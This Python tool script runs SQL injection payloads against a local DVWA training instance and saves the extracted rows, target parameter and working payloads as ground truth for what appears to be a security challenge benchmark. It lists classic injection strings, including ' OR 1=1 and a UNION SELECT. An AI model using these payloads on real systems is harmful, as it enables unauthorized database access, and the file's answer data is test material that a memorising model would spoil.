"""
Bootstrap Ground Truth from Live DVWA

This script regenerates ground_truth.json by running trusted payloads
against a live DVWA instance. Run this whenever DVWA database changes.

Usage:
    python tools/bootstrap_ground_truth.py --dvwa-url http://127.0.0.1/dvwa
"""

import asyncio
import json
import sys
from pathlib import Path
from datetime import datetime

# Add src to path
sys.path.insert(0, str(Path(__file__).parent.parent))

from src.mcp_server.tools import dvwa_sqli_basic_extract


async def bootstrap_sqli_basic(base_url: str):
    """Extract ground truth for SQL injection basic"""
    print("Bootstrapping SQL Injection Basic...")

    # Use a known-good payload
    payload = "' OR '1'='1"

    result = await dvwa_sqli_basic_extract(
        base_url=base_url,
        payload=payload
    )

    if not result.get("success"):
        raise RuntimeError("Failed to extract data with trusted payload")

    rows = result.get("rows", [])
    print(f"  ✓ Extracted {len(rows)} rows")

    return {
        "challenge_id": "dvwa-sqli-basic",
        "target_url": "/vulnerabilities/sqli/",
        "vulnerable_param": "id",
        "database": "dvwa",
        "table": "users",
        "description": "DVWA SQL Injection - Basic data extraction from users table",
        "expected_data": {
            "columns": ["id", "first_name", "last_name"],
            "rows": rows,
            "total_records": len(rows)
        },
        "working_payloads": [
            "' OR '1'='1",
            "' OR 1=1-- ",
            "1' UNION SELECT NULL, NULL, NULL-- "
        ],
        "validation_rules": {
            "min_records": max(1, len(rows) - 1),
            "required_fields": ["first_name", "last_name"],
            "known_usernames": [row.get("first_name") for row in rows]
        },
        "bootstrapped_at": datetime.now().isoformat(),
        "dvwa_url": base_url
    }


async def main(dvwa_url: str):
    """Bootstrap all ground truth data"""
    print(f"Bootstrapping ground truth from: {dvwa_url}")
    print("=" * 60)

    ground_truth = {}

    # SQL Injection Basic
    try:
        ground_truth["sql_injection_basic"] = await bootstrap_sqli_basic(dvwa_url)
    except Exception as e:
        print(f"  ✗ Failed: {e}")
        return

    # TODO: Add other challenges here
    # ground_truth["sql_injection_blind"] = await bootstrap_blind_sqli(dvwa_url)
    # ground_truth["xss_reflected"] = await bootstrap_xss_reflected(dvwa_url)

    # Save to file
    output_path = Path(__file__).parent.parent / "challenges" / "dvwa" / "ground_truth.json"
    output_path.parent.mkdir(parents=True, exist_ok=True)

    with open(output_path, 'w') as f:
        json.dump(ground_truth, f, indent=2)

    print("=" * 60)
    print(f"✓ Ground truth saved to: {output_path}")
    print(f"  Challenges: {len(ground_truth)}")
    print(f"  Timestamp: {datetime.now().isoformat()}")


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Bootstrap ground truth from live DVWA")
    parser.add_argument(
        "--dvwa-url",
        default="http://127.0.0.1/dvwa",
        help="DVWA base URL (default: http://127.0.0.1/dvwa)"
    )

    args = parser.parse_args()

    asyncio.run(main(args.dvwa_url))
